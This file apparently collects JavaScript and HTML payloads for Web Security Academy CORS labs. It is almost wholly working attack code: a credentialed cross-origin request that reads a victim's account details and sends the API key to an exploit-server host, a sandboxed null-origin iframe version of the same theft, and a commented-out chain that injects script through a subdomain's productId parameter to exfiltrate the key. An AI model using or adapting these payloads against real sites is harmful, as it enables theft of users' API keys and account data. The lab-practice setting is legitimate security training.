//Cors

//Basic Cors; gets the apikey
function getadmin() {
    var res = JSON.parse(this.response)
    fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
}

const request = new XMLHttpRequest();
request.addEventListener("load", getadmin);
request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
request.withCredentials = true;
request.send();

// If null origin is Whitelisted; gets the apikey
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var res = JSON.parse(this.response)
location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?' + res.apikey;
};
</script>"></iframe>

/* CORS vulnerability with trusted insecure protocols

<script>
    document.location="http://stock.0a8b008b03f0d3c78022492300d2001b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a8b008b03f0d3c78022492300d2001b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://exploit-0a6000290398d38f8026486501de00c2.exploit-server.net/accountDetails?data='%2bres.apikey; };%3c/script>&storeId=1"
</script>

*/